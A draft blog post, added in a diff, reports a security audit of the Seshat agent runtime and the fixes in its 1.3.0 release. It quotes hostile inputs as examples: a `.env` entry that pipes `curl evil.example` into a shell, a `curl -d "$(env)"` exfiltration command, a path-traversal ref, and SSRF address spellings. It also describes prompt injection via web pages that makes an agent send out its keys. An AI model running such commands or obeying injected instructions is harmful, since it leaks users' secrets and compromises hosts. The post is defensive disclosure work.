@@ -1,0 +1,81 @@
+---
+title: "Running AI agents safely: what an audit of our own runtime found"
+description: "A cloned repository, a .env file, a web page: the inputs that can hijack an agent are not the prompt. Seven problems we found in Seshat 1.3.0, and what changed."
+date: "2026-10-07"
+category: dev
+draft: true
+tags: ["security", "AI agents", "Go", "Seshat"]
+---
+import Callout from '@/components/docs/Callout.astro';
+import Flow from '@/components/docs/Flow.astro';
+
+An AI agent reads files and runs commands. That makes the question "what can an attacker make it read?" more important than "what can a user ask it?". Before releasing Seshat 1.3.0, we audited our own runtime with that question in mind. We found problems that a prompt filter would never have caught, because none of them came from the prompt.
+
+This is what we found, how we fixed it, and what you can check in your own agent. Everything below is in the [1.3.0 changelog](https://github.com/KPO-Tech/seshat/blob/main/CHANGELOG.md), and most of the fixes come with a test that reproduces the problem.
+
+## The files an agent reads are the attack surface
+
+<Flow items={[
+  { icon: 'git-branch', label: 'A repository you just cloned' },
+  { icon: 'file-code', label: 'Its project configuration' },
+  { icon: 'shield-check', label: 'A trust check' },
+  { icon: 'check-circle', label: 'Only then, applied' },
+]} />
+
+The terminal agent reads a project configuration from the folder you open it in. A cloned repository can carry any such file, and until 1.3.0 the agent applied all of it. A test loaded one with a stdio MCP server, a hook, a language server, a provider with a custom base URL and an API key written `$(...)`, and a list of allowed tools. All of it took effect: opening the agent in that folder started the command, and nothing asked.
+
+Now the sections that run something or send something somewhere are ignored until you run `seshat trust` in the project. The trust is recorded for the SHA-256 of each file, so a file that changes after a `git pull` has to be trusted again. The rule we give ourselves: trust a project you wrote or read, not one you only cloned. The details are in [Security and trust](/en/docs/concepts/security-and-trust).
+
+## A `.env` file that ran a command
+
+The same logic applied to the `.env` file of the working directory. An entry like `SESHAT_API_KEY=$(curl evil.example | sh)` was evaluated by a shell when the configuration loaded, before any prompt. A test made the command write a file, which proved it.
+
+An entry is now ignored, with a warning, when its value contains a shell substitution or when its name decides what runs or where Seshat looks for its configuration (`PATH`, `SHELL`, `HOME`, `LD_*`, `GIT_*`, `NODE_OPTIONS` and a few others). Keys, models and URLs still work.
+
+## Secrets in the environment of every command
+
+The `bash` tool gave every command the whole environment of the agent, provider keys included. An instruction hidden in a web page or a file could make the model run `env`, or `curl -d "$(env)" ...`, and send them out.
+
+A new filter removes the variables whose name says secret (`*_API_KEY`, `*_TOKEN`, `*_SECRET`, `*_PASSWORD`, `DATABASE_URL`), the families used by the providers, and values that plainly look like credentials. `PATH`, `HOME`, the locale, proxies and build settings stay. If a command really needs `GITHUB_TOKEN`, you name it in `SESHAT_BASH_ENV_ALLOW`.
+
+## The local network, written 28 ways
+
+The web fetch tool already refused loopback and private addresses. We wrote a test with 28 ways of spelling a local target, and several went through:
+
+- `100.64.0.0/10`, the carrier-grade NAT range, where one cloud serves its metadata endpoint at `100.100.100.200`;
+- `0.0.0.0/8`, the broadcast address, and multicast beyond link-local;
+- an IPv4 address inside a NAT64 address: `64:ff9b::7f00:1` reaches `127.0.0.1`;
+- the names `localhost.` and `metadata.google.internal.` with a trailing dot, refused only after they were resolved.
+
+They are refused now, both before and after DNS resolution. The lesson is the method, not the list: a blocklist you have not attacked yourself is a guess.
+
+## A gRPC server open to everyone
+
+The gRPC server listened on every interface, with no authentication and no TLS. Worse, `ConnectMCP` took a `command`, `args` and `env` and started that process on the host, then saved it so it came back at the next start. Anyone who could reach the port could run commands as the server's user and spend its provider keys.
+
+Closed by default now: it listens on `127.0.0.1`; on any other address it refuses to start without a token (or an explicit opt-out); with a token, every call except `HealthCheck` needs `authorization: Bearer <token>`; TLS is available; and `ConnectMCP` refuses stdio servers unless you allow them. This one is **breaking** for a deployment that reached the server from another machine, and the release notes say so.
+
+## A path that read any file
+
+A `HEAD` file containing `ref: refs/heads/../../../secret` made the code that reads the current commit return the first line of any file it could reach. A ref must now be a name under `refs/` with no `..`, no absolute path and no drive letter, and it is read through `os.Root`.
+
+## The scanner that analysed nothing
+
+We run `gosec` in CI, and it said "Issues: 0". When we looked closer, the Docker action that ships it carried an older Go than our module needs, could not load a single package, and reported zero issues. The report-only mode hid the failure.
+
+We now build and run it with the Go of the job, and a failure to load packages fails the step. The first real scan found 75 high-severity findings. We fixed or accepted 10 of them one by one (an accepted one carries a reasoned `#nosec` on its line), and excluded four classes we judged false positives for this code base, with the reason of each written in the workflow. A green check is only worth what it verified.
+
+<Callout type="tip" title="A checklist you can use today">
+1. List every file your agent reads that it did not write: project config, `.env`, fetched pages, tool results. Each one is untrusted input.
+2. Ignore anything that executes or redirects until a human approves it, and tie the approval to the file's content.
+3. Strip secrets from the environment of every command the model can run.
+4. Bind servers to loopback by default; make "open to the network" an explicit choice.
+5. Attack your own blocklists with a test, then fix what passes.
+6. Check that your scanner can fail.
+</Callout>
+
+## What this does not solve
+
+These changes close doors that were open by accident. They do not make an agent safe against a model that is manipulated within what it is allowed to do: a permitted tool can still be misused, and a user can approve something they should not. Permissions, sandboxing and review remain the layers that matter for that, and they are covered in the [documentation](/en/docs/concepts/tools-and-providers).
+
+If you are building an agent runtime and want to compare notes, the code is open: [github.com/KPO-Tech/seshat](https://github.com/KPO-Tech/seshat).
